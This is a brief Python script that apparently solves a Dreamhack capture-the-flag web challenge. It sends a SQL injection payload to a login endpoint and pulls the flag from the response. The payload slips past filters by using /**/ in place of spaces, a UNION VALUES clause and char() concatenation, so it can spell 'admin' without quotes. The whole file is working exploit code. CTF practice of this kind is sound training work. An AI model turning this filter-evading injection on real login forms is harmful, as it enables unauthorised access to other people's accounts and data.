import requests, re, base64

url = 'http://host3.dreamhack.games:20550/'

payload = '1/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))'


res = requests.post(f'{url}/login', data={'level': payload})
print(re.search(r'DH\{[^>]*\}', res.text).group(0))